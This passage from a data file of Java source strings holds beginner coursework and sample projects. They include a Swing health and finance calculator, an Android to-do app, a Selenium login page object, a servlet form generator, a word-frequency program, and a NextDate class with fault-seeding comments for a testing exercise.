+\r\n                \", Dinero Ahorrado: \" + dineroAhorrado +\r\n                \", Nivel de Ingresos: \" + nivelIngresos +\r\n                \", Fecha de Creacion: '\" + fechaCreacion + '\\'';\r\n    }\r\n}\r\n",
    "/*========================================================================================\r\n<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\r\n>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\r\n__________________________________________________________________________________________\r\n____________________________________2019/20 BATCH_________________________________________\r\n___________________________RAJARATA UNIVERSITY OF SRI LANKA_______________________________\r\n____________________________FACULTY OF MANAGEMENT STUDIES_________________________________\r\n____________________________INFORMATION SYSTEMS DEPARTMENT________________________________\r\n***********************************_MGT/2020/171_*****************************************\r\n++++++++++++++++++++++++++++++___P.H.H.C JAYASOORIYA___+++++++++++++++++++++++++++++++++++\r\n************************************__MGT/6130__******************************************\r\n__________________________________________________________________________________________\r\n>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\r\n<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\r\n==========================================================================================\r\n__________________________________________________________________________________#HASITHA\r\n*/\r\n\r\n\r\nimport javax.swing.*;\r\nimport java.awt.event.ActionListener;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.Font;\r\nimport java.awt.Color;\r\n\r\nclass MyDoc extends JFrame\r\n{\r\n\tJFrame frame1   = new JFrame();\r\n\tJLabel L1       = new JLabel();\r\n\tJLabel P2L1     = new JLabel(\"BMI\");\r\n\tJLabel P2L2\t\t= new JLabel(\"Enter your weight\");\r\n\tJLabel P2L3\t\t= new JLabel(\"Enter your Height\");\r\n\tJLabel P2L4\t\t= new JLabel(\"Kg\");\r\n\tJLabel P2L5\t\t= new JLabel(\"Cm\");\r\n\tJLabel P2L6     = new JLabel(\"BMI =\");\r\n\tJLabel P2L7     = new JLabel(\"\");\r\n\tJLabel Q1       = new JLabel(\"\");\r\n\tJLabel Q2       = new JLabel(\"\");\r\n\tJLabel Q3       = new JLabel(\"\");\r\n\tJLabel I1       = new JLabel(\"\");\r\n\tJLabel I2       = new JLabel(\"\");\r\n\tJLabel I3       = new JLabel(\"\");\r\n\tJLabel P5L1     = new JLabel(\"1\");\r\n\tJLabel P5L2     = new JLabel(\"2\");\r\n\tJLabel P5L3     = new JLabel(\"3\");\r\n\tJLabel P5L4     = new JLabel(\"4\");\r\n\tJLabel P5L5     = new JLabel(\"Color Blindness Text\");\r\n\tJLabel P5L6     = new JLabel(\"1\");\r\n\tJLabel P5L7     = new JLabel(\"2\");\r\n\tJLabel P5L8     = new JLabel(\"3\");\r\n\tJLabel P5L9     = new JLabel(\"4\");\r\n\tJLabel P5L10    = new JLabel(\"Answer\");\r\n\tJLabel P5L11    = new JLabel(\"2.\");\r\n\tJLabel P5L12    = new JLabel(\"3.\");\r\n\tJLabel P5L13    = new JLabel(\"4.\");\r\n\tJLabel P5L14    = new JLabel(\"Good\");\r\n\tJLabel P3L1     = new JLabel(\"Result =\");\r\n\tJLabel PL1      = new JLabel(\"\");\r\n\tJLabel PL2      = new JLabel(\"\");\r\n\tJLabel PL3      = new JLabel(\"Gain From Investment\");\r\n\tJLabel PL4      = new JLabel(\"Cost Of Investment\");\r\n\tJLabel PL5      = new JLabel(\"Loan Amount (Rs.) :\");\r\n\tJLabel PL6      = new JLabel(\"Interest Rate :\");\r\n\tJLabel PL7      = new JLabel(\"Months :\");\r\n\tJLabel PL8      = new JLabel(\"Monthly Payment =\");\r\n\tJLabel PL9      = new JLabel(\"Initial/Net Investment :\");\r\n\tJLabel PL10     = new JLabel(\"Annual Net Chash Flow :\");\r\n\tJLabel PL11     = new JLabel(\"Amount :\");\r\n\tJLabel PL12     = new JLabel(\"Percentage :\");\r\n\tJLabel PL13     = new JLabel(\"ROI =\");\r\n\tJLabel PL14     = new JLabel(\"Pay Back Period =\");\r\n\tJLabel PL15     = new JLabel(\"Answer =\");\r\n\tJLabel PL16     = new JLabel(\"\");\r\n\tJLabel PLM1     = new JLabel(\"Nathing happens by chance,by fate.\");\r\n\tJLabel PLM2     = new JLabel(\"You create your own fate by your actions.\");\r\n\tJLabel PLM3     = new JLabel(\"That't KARMA !\");\r\n\tJLabel PLM4     = new JLabel(\" If your BMI is less than 18.5 or above 23, seek medical advice.\");\r\n\tJLabel PLM5     = new JLabel(\"How many liters of water did you drink today ?\");\r\n\tJLabel PLM6     = new JLabel(\"Value 1\");\r\n\tJLabel PLM7     = new JLabel(\"Value 2\");\r\n\tJLabel PLM8     = new JLabel(\"Answer =\");\r\n\tJLabel PLM9     = new JLabel(\"Male\");\r\n\tJLabel PLM10    = new JLabel(\"Female\");\r\n\tJLabel PLM11    = new JLabel(\"Return On Investment (ROI)\");\r\n\tJLabel PLM12    = new JLabel(\"Bank Loan Monthly Payment\");\r\n\tJLabel PLM13    = new JLabel(\"Pay Back Period\");\r\n\tJLabel PLM14    = new JLabel(\"Percentage Calculator\");\r\n\tJLabel PLM15    = new JLabel(\"Mini Calculator\");\r\n\tJLabel PLM16    = new JLabel(\"MyDoc\");\r\n\tJLabel PLM17    = new JLabel(\"Money is as important as physical health in\");\r\n\tJLabel PLM18    = new JLabel(\"everyday life.To be Successful,\");\r\n\tJLabel PLM19    = new JLabel(\"You need to balance both Health and Finances.\");\r\n\tJLabel PLM20    = new JLabel(\"Return on Investment is a key business metric that measures the profitability of investment or marketing\");\r\n\tJLabel PLM21    = new JLabel(\"activities by weighing the size of the upfront cost against the net profits in produced.\");\r\n\tJLab",
    "package com.example.todolistapp;\nimport androidx.appcompat.app.AppCompatActivity;\nimport android.os.Bundle;\nimport androidx.appcompat.app.AlertDialog;\nimport android.content.DialogInterface;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.LinearLayout;\nimport android.widget.TextView;\n\npublic class MainActivity extends AppCompatActivity {\n    Button add;\n    AlertDialog dialog;\n    LinearLayout layout;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        add=findViewById(R.id.add);\n        layout=findViewById(R.id.container);\n\n        buildDialog();\n        add.setOnClickListener(new View.OnClickListener(){\n            @Override\n            public void onClick(View v){\n                dialog.show();\n            }\n        });\n\n    }\n    public void buildDialog(){\n        AlertDialog.Builder builder=new AlertDialog.Builder(this);\n        View view = getLayoutInflater().inflate(R.layout.dialog, null);\n\n\n        final EditText name= view.findViewById(R.id.nameEdit);\n\n        builder.setView(view);\n        builder.setTitle(\"Enter your Task\")\n                .setPositiveButton(\"SAVE\",new DialogInterface.OnClickListener(){\n                    @Override\n                    public void onClick (DialogInterface dialog,int which){\n                        addCard(name.getText().toString());\n                    }\n                })\n                .setNegativeButton(\"Cancel\", new DialogInterface.OnClickListener() {\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n\n                    }\n                });\n\n        dialog = builder.create();\n    }\n    private void addCard(String name){\n        final View view = getLayoutInflater().inflate(R.layout.card,null);\n\n\n        TextView nameView = view.findViewById(R.id.name);\n        Button delete = view.findViewById(R.id.delete);\n        nameView.setText(name);\n        delete.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                layout.removeView(view);\n            }\n        });\n        layout.addView(view);\n    }\n\n}",
    "package org.example;\nimport org.openqa.selenium.WebDriver;\nimport org.openqa.selenium.WebElement;\nimport org.openqa.selenium.support.FindBy;\nimport org.openqa.selenium.support.PageFactory;\n\npublic class LoginPage {\n    public WebDriver driver;\n    public LoginPage(WebDriver driver) {\n        PageFactory.initElements(driver, this);\n        this.driver = driver;\n    }\n\n    @FindBy(className = \"login\")\n    private WebElement openLoginWindowButton;\n    @FindBy(xpath = \"//*[contains(@id, 'p_login')]\")\n    private WebElement loginField;\n    @FindBy(xpath = \"//input[@id='start-auth']\")\n    private WebElement loginBtn;\n    @FindBy(xpath = \"//*[contains(@id, 'password')]\")\n    private WebElement passwdField;\n\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u043e\u043a\u043d\u0430 \u0434\u043b\u044f \u0432\u0432\u043e\u0434\u0430 \u043b\u043e\u0433\u0438\u043d\u0430 \u0438 \u043f\u0430\u0440\u043e\u043b\u044f\n    public void openLoginWindow() {\n        openLoginWindowButton.click();\n    }\n\n    public void inputLogin(String login) {\n        loginField.sendKeys(login);\n    }\n\n    public void inputPasswd(String passwd) {\n\n        passwdField.sendKeys(passwd);\n    }\n\n    public void clickLoginBtn() {\n        loginBtn.click();\n    }\n\n}\n",
    "package com.nt.servlet;\r\n\r\nimport java.io.IOException;\r\nimport java.io.PrintWriter;\r\n\r\nimport jakarta.servlet.ServletException;\r\nimport jakarta.servlet.annotation.WebServlet;\r\nimport jakarta.servlet.http.HttpServlet;\r\nimport jakarta.servlet.http.HttpServletRequest;\r\nimport jakarta.servlet.http.HttpServletResponse;\r\n @WebServlet(\"/firsturl\")\r\npublic class FirstServlet extends HttpServlet {\r\n\t@Override\r\n\tpublic void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\r\n\t\t  \r\n\t\t\t//get print writer\r\n\t\t\tPrintWriter pw=res.getWriter();\r\n\t\t\t//set response content type\r\n\t\t\tres.setContentType(\"text/html\");\r\n\t\t\t//read form data\r\n\t\t\tString name=req.getParameter(\"pname\");\r\n\t\t\tString fname=req.getParameter(\"fname\");\r\n\t\t\tString ms=req.getParameter(\"ms\");\r\n\t\t\t//generate dynamic form page based on the martirial status\r\n\t\t\tif(ms.equalsIgnoreCase(\"single\")) {\r\n\t\t\t\tpw.println(\"<form action='secondurl' method='post'>\");\r\n\t\t\t\tpw.println(\"<table border='0' bgcolor='cyan' align='center'>\");\r\n\t\t\t\tpw.println(\"<tr><td>when do u want to marry?</td>\");\r\n\t\t\t\tpw.println(\"<td><input type='text' name='f2t1'></td></tr>\");\r\n\t\t\t\tpw.println(\"<tr><td>why do u want to marry?</td>\");\r\n\t\t\t\tpw.println(\"<td><input type='text' name='f2t2'></td></tr>\");\r\n\t\t\t\tpw.println(\"<tr><td colspan='2'><input type='submit'value='submit'></td></tr>\");\r\n\t\t\t\tpw.println(\"</table>\");\r\n\t\t\t\tpw.println(\"</form>\");\r\n\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tpw.println(\"<form action='secondurl' method='post'>\");\r\n\t\t\t\tpw.println(\"<table border='0' bgcolor='cyan' align='center'>\");\r\n\t\t\t\tpw.println(\"<tr><td>spouse name::</td>\");\r\n\t\t\t\tpw.println(\"<td><input type='text' name='f2t1'></td></tr>\");\r\n\t\t\t\tpw.println(\"<tr><td>No of childern::</td>\");\r\n\t\t\t\tpw.println(\"<td><input type='text' name='f2t2'></td></tr>\");\r\n\t\t\t\tpw.println(\"<tr><td colspan='2'><input type='submit'value='submit'></td></tr>\");\r\n\t\t\t\tpw.println(\"</table>\");\r\n\t\t\t\tpw.println(\"</form>\");\r\n\t\t\t\t\r\n\t\t\t   }//else\r\n\t\t\t\r\n\t\t\t//close stream\r\n\t\t\t\r\n\t\t\tpw.close();\r\n\t\t\t\r\n\t\t   }//do get(-,-)\r\n\r\n\t\t\r\n\t\tpublic void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\r\n\t\t  doGet(req,res);\r\n\t\t\t\r\n\t\t}//do post\r\n\r\n\r\n}\r\n",
    "/*\u041f\u0440\u043e\u043c\u0435\u0436\u0443\u0442\u043e\u0447\u043d\u0430\u044f \u043a\u043e\u043d\u0442\u0440\u043e\u043b\u044c\u043d\u0430\u044f \u0440\u0430\u0431\u043e\u0442\u0430 \u043f\u043e \u0431\u043b\u043e\u043a\u0443 \u0421\u043f\u0435\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f\n\u0417\u0430\u0434\u0430\u043d\u0438\u0435 2.\n\u0412\u0430\u0448\u0435 \u0437\u0430\u0434\u0430\u043d\u0438\u0435 \u043d\u0430 \u043f\u0440\u043e\u043c\u0435\u0436\u0443\u0442\u043e\u0447\u043d\u0443\u044e \u0430\u0442\u0442\u0435\u0441\u0442\u0430\u0446\u0438\u044e. \u041f\u043e\u043c\u043d\u0438\u0442\u0435, \u0447\u0442\u043e \u044d\u0442\u043e \u043d\u0435\u0442\u043e\u043b\u044c\u043a\u043e \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0432\u0430\u0448\u0438\u0445 \u0437\u043d\u0430\u043d\u0438\u0439, \u043d\u043e \u0438 \u0448\u0430\u043d\u0441 \u043f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0441\u0432\u043e\u0438 \u043d\u0430\u0432\u044b\u043a\u0438! \ud83d\ude0a\n\u0412\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435:\n\u0412\u0430\u0448 \u0444\u0430\u0439\u043b `input.txt` \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u0441\u043b\u043e\u0432, \u0440\u0430\u0437\u0434\u0435\u043b\u0435\u043d\u043d\u044b\u0445 \u043f\u0440\u043e\u0431\u0435\u043b\u0430\u043c\u0438. \u042d\u0442\u043e \u0441\u043b\u043e\u0432\u0430-\u0444\u0440\u0443\u043a\u0442\u044b, \u043e\u0432\u043e\u0449\u0438 \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u043f\u0440\u043e\u0434\u0443\u043a\u0442\u044b.\n\u041f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u044c\u0442\u0435, \u0447\u0442\u043e \u044d\u0442\u043e \u0432\u0430\u0448 \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439 \u043f\u0438\u043a\u043d\u0438\u043a! \ud83c\udf4e\ud83e\udd55\ud83e\udd67\n\u0417\u0430\u0434\u0430\u043d\u0438\u044f:\n        1. \u041e\u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0438\u0442\u044c \u043f\u043e\u0434\u0441\u0447\u0435\u0442 \u0441\u043b\u043e\u0432:\n        \u041d\u0430\u043f\u0438\u0448\u0438\u0442\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u043e\u0434\u0441\u0447\u0438\u0442\u044b\u0432\u0430\u0435\u0442 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u043b\u043e\u0432 \u0432 \u0444\u0430\u0439\u043b\u0435 `input.txt`.\n        2. \u041d\u0430\u0439\u0442\u0438 \u0441\u0430\u043c\u043e\u0435 \u0434\u043b\u0438\u043d\u043d\u043e\u0435 \u0441\u043b\u043e\u0432\u043e:\n        \u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043d\u0430\u0445\u043e\u0434\u0438\u0442 \u0441\u0430\u043c\u043e\u0435 \u0434\u043b\u0438\u043d\u043d\u043e\u0435 \u0441\u043b\u043e\u0432\u043e \u0432 \u0444\u0430\u0439\u043b\u0435.\n        3. \u0412\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c \u0447\u0430\u0441\u0442\u043e\u0442\u0443 \u0441\u043b\u043e\u0432:\n        \u041d\u0430\u043f\u0438\u0448\u0438\u0442\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u0430\u043d\u0430\u043b\u0438\u0437\u0438\u0440\u0443\u0435\u0442, \u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0440\u0430\u0437 \u043a\u0430\u0436\u0434\u043e\u0435 \u0441\u043b\u043e\u0432\u043e \u0432\u0441\u0442\u0440\u0435\u0447\u0430\u0435\u0442\u0441\u044f \u0432 \u0444\u0430\u0439\u043b\u0435. \u041f\u043e\u0434\u0443\u043c\u0430\u0439\u0442\u0435 \u043e\u0431 \u044d\u0442\u043e\u043c \u043a\u0430\u043a \u043e \u043f\u043e\u0434\u0441\u0447\u0435\u0442\u0435 \u0442\u043e\u0433\u043e,\n\u043a\u0430\u043a\u0438\u0435 \u0444\u0440\u0443\u043a\u0442\u044b \u0438 \u043e\u0432\u043e\u0449\u0438 \u0441\u0430\u043c\u044b\u0435 \u043f\u043e\u043f\u0443\u043b\u044f\u0440\u043d\u044b\u0435 \u043d\u0430 \u0432\u0430\u0448\u0435\u043c \u043f\u0438\u043a\u043d\u0438\u043a\u0435! \ud83c\udf47\ud83c\udf49\n        \ud83d\udca1 \u041d\u0435 \u0437\u0430\u0431\u044b\u0432\u0430\u0439\u0442\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0446\u0438\u043a\u043b\u044b \u0438 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438 \u0434\u043b\u044f \u0443\u043f\u0440\u043e\u0449\u0435\u043d\u0438\u044f \u0432\u0430\u0448\u0438\u0445 \u0437\u0430\u0434\u0430\u0447. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, `HashMap` \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043e\u0447\u0435\u043d\u044c \u043f\u043e\u043b\u0435\u0437\u043d\u044b\u043c\n        \u0434\u043b\u044f \u043f\u043e\u0434\u0441\u0447\u0435\u0442\u0430 \u0447\u0430\u0441\u0442\u043e\u0442\u044b \u0441\u043b\u043e\u0432. \u042d\u0442\u043e \u043a\u0430\u043a \u0438\u043c\u0435\u0442\u044c \u043a\u043e\u0440\u0437\u0438\u043d\u043a\u0443 \u0434\u043b\u044f \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0432\u0438\u0434\u0430 \u0444\u0440\u0443\u043a\u0442\u043e\u0432 \u043d\u0430 \u043f\u0438\u043a\u043d\u0438\u043a\u0435! \ud83e\uddfa\n\u0423\u0434\u0430\u0447\u0438, \u0438 \u043f\u043e\u043c\u043d\u0438\u0442\u0435: \u043a\u0430\u0436\u0434\u0430\u044f \u0437\u0430\u0434\u0430\u0447\u0430 - \u044d\u0442\u043e \u0448\u0430\u0433 \u043a \u043f\u043e\u043d\u0438\u043c\u0430\u043d\u0438\u044e \u043c\u0438\u0440\u0430 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f! \u0412\u044b \u0441\u043f\u0440\u0430\u0432\u0438\u0442\u0435\u0441\u044c! \ud83d\udcaa\udb82\udc01\udb81\udfb5*/\n\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.util.*;\n\npublic class Main {\n    public static void main(String[] args) throws IOException {\n        // \u0421\u0447\u0438\u0442\u044b\u0432\u0430\u0435\u043c \u0444\u0430\u0439\u043b \u0438 \u0437\u0430\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u043c \u0432\u0435\u0441\u044c \u0442\u0435\u043a\u0441\u0442 \u0432 \u0441\u0442\u0440\u043e\u043a\u0443\n        String stroka = new String();\n        File myFile = new File(\"input.txt\");\n        FileInputStream inputStream = null;\n        try {\n            inputStream = new FileInputStream(myFile);\n        } catch (FileNotFoundException e) {\n            throw new RuntimeException(e);\n        }\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = inputStream.read(buffer)) != -1) {\n            stroka = new String(buffer, 0, bytesRead);\n            System.out.println(\"\u0418\u0441\u0445\u043e\u0434\u043d\u044b\u0439 \u0444\u0430\u0439\u043b: \" + stroka);\n            System.out.println();\n        }\n        inputStream.close();\n\n        //\u0421\u043f\u043b\u0438\u0442\u0443\u0435\u043c \u043f\u043e \u043f\u0440\u043e\u0431\u0435\u043b\u0443 \u0438 \u0437\u0430\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u043c \u0432\u0441\u0451 \u0432 \u0441\u043f\u0438\u0441\u043e\u043a\n        String[] text = new String[]{};\n        text = stroka.split(\"\\\\s+\");\n\n        // \u0421\u0447\u0438\u0442\u0430\u0435\u043c \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u043b\u043e\u0432 \u0432 \u0444\u0430\u0439\u043b\u0435\n        //System.out.println(\"\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u043b\u043e\u0432 \u0432 \u0444\u0430\u0439\u043b\u0435 = \" + text.length);\n\n        //\u041d\u0430\u0445\u043e\u0434\u0438\u043c \u0441\u0430\u043c\u043e\u0435 \u0434\u043b\u0438\u043d\u043d\u043e\u0435 \u0441\u043b\u043e\u0432\u043e\n        Map<String,Integer> dlina = new HashMap<>();\n        for (String i : text){\n            dlina.putIfAbsent(i, i.length());\n        }\n        ArrayList<Integer> valueList = new ArrayList<>(dlina.values());\n        Integer maxdlina = Collections.max(valueList);\n        String maxslovo = null;\n        for (String i : text){\n            if (i.length() == maxdlina) maxslovo = i; \n        }\n        //System.out.println(\"\u0421\u0430\u043c\u043e\u0435 \u0434\u043b\u0438\u043d\u043d\u043e\u0435 \u0441\u043b\u043e\u0432\u043e \u0432 \u0444\u0430\u0439\u043b\u0435 \u044d\u0442\u043e - \" + maxslovo );\n\n        //\u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u0447\u0430\u0441\u0442\u043e\u0442\u0443 \u0441\u043b\u043e\u0432\n        Map<String,Integer> chastota = new HashMap<>();\n        for (String i : text){\n            if (chastota.containsKey(i)){\n                    chastota.put(i, chastota.get(i) + 1);\n                }\n            else {\n                chastota.put(i,1);\n            }\n        }\n        ArrayList<Integer> valueList2 = new ArrayList<>(chastota.values());\n        Integer indexchastoeslovo = Collections.max(valueList2);\n        String chastoeslovo = null;\n        for (var item:chastota.entrySet()){\n            if (item.getValue() == indexchastoeslovo) chastoeslovo = item.getKey();\n        }\n        //System.out.println(\"\u0421\u0430\u043c\u043e\u0435 \u0447\u0430\u0441\u0442\u043e\u0435 \u0441\u043b\u043e\u0432\u043e \u0432 \u0444\u0430\u0439\u043b\u0435 \u044d\u0442\u043e - \" + chastoeslovo );\n\n        //\u0423\u043a\u0440\u0430\u0441\u0438\u043c \u043e\u0442\u0432\u0435\u0442:\n        System.out.println(\"\u041d\u0430 \u043f\u0438\u043a\u043d\u0438\u043a \u0441\u0435\u0433\u043e\u0434\u043d\u044f \u0443 \u043d\u0430\u0441 \u0441 \u0441\u043e\u0431\u043e\u0439 \u0432\u0441\u0435\u0433\u043e: \" + text.length + \" \u043f\u0440\u043e\u0434\u0443\u043a\u0442\u043e\u0432. \\n\" +\n                \"\u0421\u043b\u043e\u0436\u043d\u0435\u0435 \u0432\u044b\u0433\u043e\u0432\u043e\u0440\u0438\u0442\u044c \u0438\u0437 \u0442\u043e\u0433\u043e \u0447\u0442\u043e \u043c\u044b \u0432\u0437\u044f\u043b\u0438 \u0441 \u0441\u043e\u0431\u043e\u0439 \u044d\u0442\u043e - \" + maxslovo + \". \\n\" +\n                \"\u0421\u0430\u043c\u044b\u0439 \u043f\u043e\u043f\u0443\u043b\u044f\u0440\u043d\u044b\u0439 \u043f\u0440\u043e\u0434\u0443\u043a\u0442 \u0443 \u043c\u0435\u043d\u044f \u043d\u0430 \u043f\u0438\u043a\u043d\u0438\u043a\u0435 \u044d\u0442\u043e - \" + chastoeslovo+ \". \\n\" +\n                \"\u0421\u043f\u0430\u0441\u0438\u0431\u043e \u0437\u0430 \u0432\u043d\u0438\u043c\u0430\u043d\u0438\u0435)\\n\");\n\n\n\n\n    }\n}\n",
    "package ee.ut.cs.swt.nextdate;\n\npublic class NextDate {\n\t\n\tpublic NextDate(int m, int d, int y)\n\t{\n\t\t//int month, day, year; //varibles holding the month, day and year args\n\t\t//Initialize the mont, day, and year, respectively\n\t\t//month = m;\n\t\t//day = d;\n\t\t//year = y;\n\t}\n\t\n\t\n\t/*********************************************************\n\t**Method: run\n\t**Returns: string\n\t**Description: This method will return a string depicting the nextDate in the from MM/DD/YY \n\t***********************************************************/\n\t\n\tpublic String run(int month, int day, int year) {\n\t\t\n\t\t//Restrictions that the year must have the following invariant: 1801 <= year <= 2021\n\t\t\n\t\tif (day < 1 || month < 1 || month >12 || year < 1801 || year > 2021 || day > 31)\n\t\t\treturn \"invalid Input Date\";\n\t\t\n\t\t//these variables will hold the proper values for the nextDate's day, month, and year values, respectively\n\t\tint tomorrowDay = day;\n\t\tint tomorrowMonth = month;\n\t\tint tomorrowYear = year;\n\t\t\n\t\t//Is this month with 31 days?\n\t\tif(isThirtyOneDayMonth(month))\n\t\t{\n\n\t\t\tif(day < 31) //if the day is not 31, just increment the day\n\t\t\t\ttomorrowDay = day +1;\n\t\t\telse{ //day = 31, set tomorrow's day to 1 and increment the month\n\t\t\t\ttomorrowDay = 1;\n\t\t\t\ttomorrowMonth = month + 1;\n\t\t\t}\n\t\t}\n\t\t//is this month a month with 30 days?\n\t\telse if (isThirtyDayMonth(month))\n\t\t{\n\t\t\tif(day <30) //if the day is not 30, just increment the day\n\t\t\t\ttomorrowDay = day + 1;\n\t\t\telse {\n\t\t\t\tif(day == 30){\n\t\t\t\t\ttomorrowDay = 1;\n\t\t\t\t\ttomorrowMonth = month +1;\n\t\t\t\t}\n\t\t\t\telse //invalid input ... too many days\n\t\t\t\t\treturn \"Invalid Input Date\";\n\t\t\t}\n\t\t}\n\t\t//is this month December?\n\t\telse if(isDecember(month))\n\t\t{\n\t\t\t// To fix \"Fault 1\", uncomment the correct line 63 and comment out the incorrect line 62.\n//\t\t\tif(day <= 31) //if the day is not 31, just increment the day\n\t\t\tif (day < 31) //if the day is not 31, just increment the next day\n\t\t\t\ttomorrowDay = day +1;\n\t\t\telse { //day is 31, reset the day and month to 1 and increment the year\n\t\t\t\ttomorrowDay = 1;\n\t\t\t\ttomorrowMonth = 1;\n\t\t\t// To fix \"Fault 2\", uncomment the correct line 70 and comment out the incorrect line 69\n//\t\t\t\tif(year == 2022) //make sure the next year is within the permissible range\n\t\t\t\tif(year == 2021) //make sure the next year is within the permissible range\n\t\t\t\t\treturn \"Invalid Next Year\";\n\t\t\t\telse  //it was a permissible year - go ahead and increment the year\n\t\t\t\t\ttomorrowYear = year +1;\n\t\t\t}\n\t\t\t\t\n\t\t}\n\t\t//is this month February? we need to check for leap years and such\n\t\telse if(isFebruary(month))\n\t\t{\n\t\t\tif(day < 28) //just a standard day - increment the day\n\t\t\t\ttomorrowDay =day +1;\n\t\t\telse {\n\t\t\t\tif(day == 28) {  //if this is not a leap year, reset day and increment the day\n\t\t\t\t\t// step 1. to enable leap year functionality , uncomment lines 85-87 and 90\n\t\t\t\t\tif(isLeapYear(year)) //was a leap year\n\t\t\t\t\t\ttomorrowDay = 29;\n\t\t\t\t\telse {  //was not a leap year\n\t\t\t\t\t\ttomorrowDay = 1;\n\t\t\t\t\t\ttomorrowMonth = 3;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if(day == 29){ //29th date of February\n\t\t\t\t\t// step 2. To enable leap year functionality , uncomment lines 94-97 and 99\n\t\t\t\t\tif(isLeapYear(year)){  //AND a leap year - reset the day to 1, month to 3\n\t\t\t\t\t\ttomorrowDay = 1;\n\t\t\t\t\t\ttomorrowMonth = 3;\n\t\t\t\t\t}\n\t\t\t\t\t// To seed \"Fault 4\", comment out the lines 99-100\n\t\t\t\t\telse\n\t\t\t\t\t\treturn \"Invalid Input Date\";\n\t\t\t\t}\n\t\t\t\t//\n\t\t\t\telse //if(day > 29) invalid input as February will never have more than 29 days\n\t\t\t\t\treturn \"Invalid Input Date\";\n\t\t\t}\n\t\t}\n\t\t//return the string representing the nextDate, in the form MM/DD/YY\n\t\treturn tomorrowMonth + \"/\" + tomorrowDay + \"/\" + tomorrowYear;\n\n\t}\n\t\n\t\n\t/*********************************************\n\t * Method: isThirtyOneDayMonth\n\t * @param month\n\t * @returns boolean\n\t * Description: This method will return true is 'month' corresponds to a \n\t * month that contains 31 days, excluding December\n\t */\n\t\n\tprivate static boolean isThirtyOneDayMonth(int month)\n\t{\n\t\t// To fix \"Fault 3\", uncomment the correct line 125 and comment out the incorrect line 124\n\t\treturn month == 1 || month == 3 || month == 5 || month == 8 || month == 10;\n//\t\treturn month == 1 || month == 3 || month == 5 || month==7 || month == 8 || month == 10;\n\t}\n\t\n\t\n\t/*************************************************\n\t * Method: isThirtyDayMonth\n\t * @param month\n\t * @returns boolean\n\t * Description: This method will return true if 'month' corresponds to a\n\t * month that contains 30 days.\t * \n\t */\n\t\n\tprivate static boolean isThirtyDayMonth(int month)\n\t{\n\t\treturn month == 4 || month == 6 || month == 9 || month == 11;\n\t}\n\t\n\t\n\t/**************************************************\n\t * Method: isDecember\n\t * @param month\n\t * @returns boolean\n\t * Description: This method will return true if 'month' corresponds to\n\t * December\n\t */\n\t\n\tprivate static boolean isDecember(int month)\n\t{\n\t\treturn month == 12;\n\t}\n\t\n\t\n\t/****************************************************\n\t * Method: isFebruary\n\t * @param month\n\t * @returns boolean\n\t * Description: This method will retur",
